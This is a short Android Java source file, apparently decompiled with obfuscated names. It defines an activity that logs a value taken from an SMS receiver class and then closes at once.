package com.network.android;

import android.app.Activity;
import android.os.Bundle;
import com.network.android.c.a.a;

public class NetworkMain extends Activity {
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        a.a("Main activity: " + SmsReceiver.f40a);
        finish();
    }
}
